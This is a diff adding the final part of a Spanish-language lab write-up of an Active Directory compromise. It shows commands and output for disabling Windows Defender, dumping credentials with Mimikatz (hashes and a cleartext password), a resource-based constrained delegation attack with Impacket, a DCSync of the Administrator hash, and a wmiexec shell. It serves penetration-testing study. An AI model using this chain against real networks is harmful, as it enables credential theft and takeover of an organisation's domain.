@@ -1120,6 +1120,237 @@ SMB         gelus.roundsoft.local 445    GELUS            WDAGUtilityAccount:504
 PS C:\Users\Administrator\Documents> whoami
 gelus\administrator
 PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
-RPG{l3ave_my_hash3s_al0ne!}
+RPG{l3av*******h3s_al0ne!}
+```
+Para garantizar la continuidad operativa y evitar posibles conflictos, hemos decidido desactivar temporalmente el software antivirus mientras realizamos tareas administrativas. Durante este proceso, utilizamos la herramienta Mimikatz para extraer información relevante, como los hashes de las contraseñas de inicio de sesión. Entre los datos obtenidos, identificamos varios hashes de interés, destacando especialmente el hash correspondiente al usuario 'jops', el cual no estaba previamente registrado en nuestra base de datos
+
+```powershell
+PS C:\Users\Administrator\Documents> Set-MpPreference -DisableRealTimeMonitoring $true -DisableIOAVProtection $true
+PS C:\Users\Administrator\Documents> cmd /c "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2004.6-0\MpCmdRun.exe" -RemoveDefinitions -All  
+
+Service Version: 4.18.2203.5
+Engine Version: 1.1.19200.5
+AntiSpyware Signature Version: 1.363.1464.0
+AntiVirus Signature Version: 1.363.1464.0
+
+Starting engine and signature rollback to none...
+Done!
+PS C:\Users\Administrator\Documents> upload mimikatz.exe
+
+Info: Uploading mimikatz.exe to C:\Users\Administrator\Documents\mimikatz.exe
+
+Data: 1807016 bytes of 1807016 bytes copied
+
+Info: Upload successful!
+
+PS C:\Users\Administrator\Documents> .\mimikatz.exe "sekurlsa::logonPasswords" exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 391204 (00000000:0005f824)
+Session           : Interactive from 1
+User Name         : athompson
+Domain            : ROUNDSOFT
+Logon Server      : SHINRA
+Logon Time        : 8/25/2023 6:50:25 PM
+SID               : S-1-5-21-2284550090-1208917427-1204316795-1676
+	msv :
+	 [00000003] Primary
+	 * Username : AThompson
+	 * Domain   : ROUNDSOFT
+	 * NTLM     : 14b1991918cdba8474847c8848a8b656
+	 * SHA1     : 2b416c46d974004d9db7f799792639729cf7c137
+	 * DPAPI    : da282f62633c3e7bdeadb02816ff7be6
+	tspkg :
+	wdigest :
+	 * Username : AThompson
+	 * Domain   : ROUNDSOFT
+	 * Password : (null)
+	kerberos :
+	 * Username : AThompson
+	 * Domain   : ROUNDSOFT.LOCAL
+	 * Password : (null)
+	ssp :
+	credman :
+	 [00000000]
+	 * Username : roundsoft\ruby_adm
+	 * Domain   : gelus
+	 * Password : b3aut1fu1_lyk_@_g3m!
+
+Authentication Id : 0 ; 68684 (00000000:00010c4c)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/25/2023 6:49:40 PM
+SID               : S-1-5-90-0-1
+	msv :
+	 [00000003] Primary
+	 * Username : GELUS$
+	 * Domain   : ROUNDSOFT
+	 * NTLM     : 0bb6f6f24c1afa9ceabc119fed53b9ba
+	 * SHA1     : 332608fd6cb7fdc10af757ae38bf737fb5b8c9a2
+	tspkg :
+	wdigest :
+	 * Username : GELUS$
+	 * Domain   : ROUNDSOFT
+	 * Password : (null)
+	kerberos :
+	 * Username : GELUS$
+	 * Domain   : Roundsoft.local
+	 * Password : 62 c5 38 18 d9 c2 d9 b0 12 30 c0 91 77 5d f3 a1 75 1a 1e d3 a8 e5 b7 b1 5b 83 cb 50 a6 f2 31 19 00 c3 07 6c b3 dc 85 b3 41 3b 8f 16 1b df 74 6d 7e d2 0f d9 4a b2 52 66 4b 54 13 dd 93 dd 15 b3 76 88 62 f3 11 34 8b ea 2c db f2 af 67 d6 67 2f a2 f2 6f 4b 6c 1a 7c ec 1f b7 c2 19 f0 11 d6 98 66 d9 61 23 55 15 2a d7 b5 77 0d 03 18 8a c8 78 1a e7 c8 66 4d d8 c2 1e 36 d7 fb b7 32 ba c6 d4 08 52 be 5a 8e 7d 3b 5c 17 0c 19 f4 83 96 a0 b3 25 8d 43 71 1c 02 80 59 fa df e3 a7 f5 71 bd 53 5d 8d d6 05 0d 7d c7 bc d3 0c 22 f6 bb 67 3f 4b 29 ff 01 52 64 39 a7 d5 41 04 5f 7b 16 31 82 4f 95 50 a7 cd d7 e8 b9 b5 e2 61 28 62 43 81 5d cc 9a 87 95 e2 0e c1 47 7f d7 ef 55 45 e0 22 2f 09 a9 02 23 5e 60 1a 90 68 87 b6 a0 e6 a1 7f a4 0b  
+	ssp :
+	credman :
+
+Authentication Id : 0 ; 93648 (00000000:00016dd0)
+Session           : Batch from 0
+User Name         : repository_admin
+Domain            : ROUNDSOFT
+Logon Server      : SHINRA
+Logon Time        : 8/25/2023 6:49:58 PM
+SID               : S-1-5-21-2284550090-1208917427-1204316795-1110
+	msv :
+	 [00000003] Primary
+	 * Username : repository_admin
+	 * Domain   : ROUNDSOFT
+	 * NTLM     : 61191aeb8b9a60d01e41faa8bacb2334
+	 * SHA1     : fc4b6cb866a39ff10daacc9273f46a68d03dd0c5
+	 * DPAPI    : be550fd796d51b6a89a33bb2f91b8bc2
+	tspkg :
+	wdigest :
+	 * Username : repository_admin
+	 * Domain   : ROUNDSOFT
+	 * Password : (null)
+	kerberos :
+	 * Username : repository_admin
+	 * Domain   : ROUNDSOFT.LOCAL
+	 * Password : (null)
+	ssp :
+	credman :
+
+Authentication Id : 0 ; 422631 (00000000:000672e7)
+Session           : Batch from 0
+User Name         : jops
+Domain            : ROUNDSOFT
+Logon Server      : SHINRA
+Logon Time        : 8/25/2023 6:50:28 PM
+SID               : S-1-5-21-2284550090-1208917427-1204316795-1602
+	msv :
+	 [00000003] Primary
+	 * Username : jops
+	 * Domain   : ROUNDSOFT
+	 * NTLM     : f7b8e6e5af23f06fdbb559d1888261fa
+	 * SHA1     : f96c0dfad6ef2f6c97d1a1076705a0a65b1b10b8
+	 * DPAPI    : 1364f3312f690918fbe42fa9b55adaed
+	tspkg :
+	wdigest :
+	 * Username : jops
+	 * Domain   : ROUNDSOFT
+	 * Password : (null)
+	kerberos :
+	 * Username : jops
+	 * Domain   : ROUNDSOFT.LOCAL
+	 * Password : (null)
+	ssp :
+	credman :
+
+mimikatz(commandline) # exit
+Bye!
 ```
 
+El usuario 'jops' tiene privilegios en el grupo 'Operators', incluyendo 'GenericWrite' sobre el DC 'SHINRA', lo que permite un ataque RBCD. Utilizando herramientas como Impacket, podemos crear una cuenta de equipo y configurar la delegación de credenciales ('rbcd'), lo que amplía nuestro acceso en la red.
+
+```bash
+❯ impacket-addcomputer -computer-name attackersystem$ -computer-pass 123456 'roundsoft.local/jops' -hashes :f7b8e6e5af23f06fdbb559d1888261fa
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Successfully added machine account attackersystem$ with password 123456.
+
+❯ impacket-rbcd -delegate-from attackersystem$ -delegate-to SHINRA$ -action write 'roundsoft.local/jops' -hashes :f7b8e6e5af23f06fdbb559d1888261fa  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] attackersystem$ can now impersonate users on SHINRA$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     attackersystem$   (S-1-5-21-2284550090-1208917427-1204316795-10101)
+```
+
+Al intentar autenticarnos como la máquina para obtener un ticket suplantando al Administrador, recibimos un error. Sin embargo, logramos suplantar al equipo 'SHINRA$' sin problemas.
+
+```bash
+❯ impacket-getST -spn cifs/shinra.roundsoft.local roundsoft.local/'attackersystem$':123456 -impersonate Administrator  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
+[-] Probably SPN is not allowed to delegate by user attackersystem$ or initial TGT not forwardable
+
+❯ impacket-getST -spn cifs/shinra.roundsoft.local roundsoft.local/'attackersystem$':123456 -impersonate SHINRA$  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting TGT for user
+[*] Impersonating SHINRA$
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in SHINRA$.ccache
+
+❯ export KRB5CCNAME='SHINRA$.ccache'
+```
+
+Al autenticarnos con el hash del equipo 'SHINRA$', que es el Controlador de Dominio (DC) y tiene privilegios DCSync sobre el dominio, podemos obtener el hash de 'Administrator'. Sin embargo, al intentar autenticarnos con el hash NT de 'Administrator' a nivel de dominio, nos encontramos con un error debido a una restricción en esta cuenta.
+
+```bash
+❯ crackmapexec smb shinra.roundsoft.local -k --use-kcache
+SMB         shinra.roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+SMB         shinra.roundsoft.local 445    SHINRA           [+] Roundsoft.local\SHINRA$ from ccache
+
+❯ crackmapexec smb shinra.roundsoft.local -k --use-kcache --ntds drsuapi --user Administrator
+SMB         shinra.roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+SMB         shinra.roundsoft.local 445    SHINRA           [+] Roundsoft.local\SHINRA$ from ccache 
+SMB         shinra.roundsoft.local 445    SHINRA           [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         shinra.roundsoft.local 445    SHINRA           [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         shinra.roundsoft.local 445    SHINRA           administrator:500:aad3b435b51404eeaad3b435b51404ee:fe29edb1766170b8afe7a55cbf360885:::
+❯ crackmapexec smb shinra.roundsoft.local -u Administrator -H fe29edb1766170b8afe7a55cbf360885
+SMB         roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\Administrator:fe29edb1766170b8afe7a55cbf360885 STATUS_ACCOUNT_RESTRICTION
+``````
+
+La restricción en la autenticación con el hash NT de 'Administrator' se debe a que el usuario pertenece al grupo 'Protected Users'. Sin embargo, esta restricción se puede eludir fácilmente agregando el parámetro '-k' para autenticarnos por Kerberos donde no se aplica. Esto nos permite obtener acceso con éxito ('Pwn3d!'). Posteriormente, podemos conectar con 'wmiexec' para obtener una shell y leer la flag.
+
+```
+❯ crackmapexec smb shinra.roundsoft.local -u Administrator -H fe29edb1766170b8afe7a55cbf360885 -k
+SMB         shinra.roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+SMB         shinra.roundsoft.local 445    SHINRA           [+] Roundsoft.local\Administrator:fe29edb1766170b8afe7a55cbf360885 (Pwn3d!)
+```
+
+```powershell
+❯ impacket-wmiexec roundsoft.local/Administrator@shinra.roundsoft.local -hashes :fe29edb1766170b8afe7a55cbf360885 -k -shell-type powershell  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> whoami
+roundsoft\administrator
+
+PS C:\> hostname
+Shinra
+
+PS C:\> type C:\Users\Administrator\Desktop\flag.txt
+RPG{WhY_w0rK_h@r*******N_d3l3g@7e?}
+
+PS C:\>
+```
+
+Y eso seria todo respecto a Pwned el Laboratorio.
